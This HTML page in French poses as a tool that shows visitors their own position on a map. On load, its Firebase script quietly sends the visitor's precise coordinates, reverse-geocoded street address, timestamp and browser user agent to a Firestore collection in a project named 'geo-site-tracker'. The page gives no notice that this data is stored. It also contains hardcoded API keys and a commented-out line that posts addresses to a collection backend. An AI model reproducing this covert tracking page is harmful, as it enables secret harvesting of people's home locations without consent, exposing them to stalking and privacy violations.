<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Voir ma position exacte</title>
  <style>
    body { font-family: sans-serif; padding: 1rem; }
    #map { width: 100%; height: 400px; margin-top: 1rem; }
    button { padding: 0.6rem 1.2rem; font-size: 1rem; }
    #status { margin-top: 1rem; font-weight: bold; }
  </style>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
<!-- Firebase SDKs -->
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-analytics.js";
  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

  // üîê Ta configuration Firebase
  const firebaseConfig = {
    apiKey: "AIzaSyCERRYunxY5FSS877mUdKHo6W1mRXIPjgM",
    authDomain: "geo-site-tracker.firebaseapp.com",
    projectId: "geo-site-tracker",
    storageBucket: "geo-site-tracker.firebasestorage.app",
    messagingSenderId: "837391043750",
    appId: "1:837391043750:web:4a5eb441e598df0bfab867",
    measurementId: "G-0WSGVT6HGT"
  };

  // ‚úÖ Initialisation Firebase
  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
  const db = getFirestore(app);

  // üìç Fonction pour enregistrer la position
  async function enregistrerPosition(lat, lon, adresse) {
    try {
      await addDoc(collection(db, "positions"), {
        latitude: lat,
        longitude: lon,
        adresse: adresse,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      });
      console.log("üìå Position enregistr√©e avec succ√®s !");
    } catch (e) {
      console.error("‚ùå Erreur Firestore :", e);
    }
  }

  // üì° R√©cup√®re la position g√©ographique et adresse
  async function getAdresseEtEnvoyer() {
    if (!navigator.geolocation) {
      alert("La g√©olocalisation n‚Äôest pas support√©e.");
      return;
    }

    navigator.geolocation.getCurrentPosition(async (position) => {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      const res = await fetch(`https://api.geoapify.com/v1/geocode/reverse?lat=${lat}&lon=${lon}&apiKey=708354c5ad334d41b0611f73996998e1`);
      const data = await res.json();
      const adresse = data.features?.[0]?.properties?.formatted || "Adresse inconnue";

      document.getElementById("adresse").innerText = `üìç ${adresse}`;

      // üíæ Enregistrement dans Firestore
      await enregistrerPosition(lat, lon, adresse);
    },
    () => alert("‚ùå Permission refus√©e ou erreur de g√©olocalisation."),
    { enableHighAccuracy: true });
  }

  // ‚ñ∂Ô∏è D√©marre au chargement
  window.onload = getAdresseEtEnvoyer;
</script>
</head>
<body>
  <h1>Voir ma position exacte</h1>
  <button onclick="getLocation()">Voir ma position</button>
  <div id="status"></div>
  <div id="map"></div>
  <p id="adresse">Recherche de votre adresse...</p>
  <h2 id="adresse">üìç Recherche de votre position...</h2>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script>
  // Fonction pour obtenir l‚Äôadresse exacte
  function getAdresseExacte() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(async function(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        // Remplace ici par TA propre cl√© API Geoapify
        const apiKey = "TA_CLE_API_ICI";

        const url = `https://api.geoapify.com/v1/geocode/reverse?lat=${latitude}&lon=${longitude}&apiKey=${apiKey}`;

        const response = await fetch(url);
        const data = await response.json();

        if (data.features && data.features.length > 0) {
          const adresse = data.features[0].properties.formatted;
          document.getElementById("adresse").innerText = "Votre adresse : " + adresse;

          // Optionnel : envoyer vers ton backend
          // fetch("https://mon-backend.com/collecte", { method: "POST", body: JSON.stringify({ adresse }) });

        } else {
          document.getElementById("adresse").innerText = "Impossible de d√©terminer l'adresse.";
        }

      }, function(error) {
        alert("Permission refus√©e ou erreur de g√©olocalisation.");
      }, { enableHighAccuracy: true });
    } else {
      alert("G√©olocalisation non support√©e.");
    }
  }

  // Appel automatique au chargement de la page
  window.onload = getAdresseExacte;
</script><script>
    let map, marker;

    function getLocation() {
      const status = document.getElementById("status");
      status.textContent = "Localisation en cours‚Ä¶";

      if (!navigator.geolocation) {
        status.textContent = "G√©olocalisation non support√©e.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          status.innerHTML = `
            <p>Latitude : ${lat}</p>
            <p>Longitude : ${lon}</p>
          `;

          // Affichage de la carte
          if (!map) {
            map = L.map('map').setView([lat, lon], 16);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
              attribution: '&copy; OpenStreetMap contributors'
            }).addTo(map);
            marker = L.marker([lat, lon]).addTo(map).bindPopup("Vous √™tes ici").openPopup();
          } else {
            map.setView([lat, lon], 16);
            marker.setLatLng([lat, lon]);
          }

          // Appel de l'API Nominatim pour l'adresse postale
          fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
            .then(res => res.json())
            .then(data => {
              if (data.display_name) {
                status.innerHTML += `<p><strong>Adresse :</strong> ${data.display_name}</p>`;
              } else {
                status.innerHTML += `<p>Adresse non trouv√©e.</p>`;
              }
            })
            .catch(() => {
              status.innerHTML += `<p>Erreur lors de la r√©cup√©ration de l'adresse.</p>`;
            });
        },
        (error) => {
          status.textContent = "Erreur de localisation : " + error.message;
        },
        { enableHighAccuracy: true }
      );
    }
  </script>
</body>
</html>
